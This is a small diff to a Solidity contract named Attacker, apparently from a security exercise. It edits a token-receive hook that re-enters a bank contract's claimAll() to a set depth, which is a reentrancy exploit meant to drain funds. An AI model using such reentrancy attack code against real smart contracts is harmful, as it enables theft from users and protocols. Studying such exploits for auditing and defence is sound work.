@@ -71,10 +71,9 @@ contract Attacker is AccessControl, IERC777Recipient {
         // If we haven't reached max depth, reenter by calling claimAll again
         if (depth < max_depth) {
             depth++;
+            emit Recurse(depth);
             bank.claimAll();
-        } else {
-            // Reset depth for potential future attacks
-            depth = 0;
+            depth--;
         }		
 	}
 
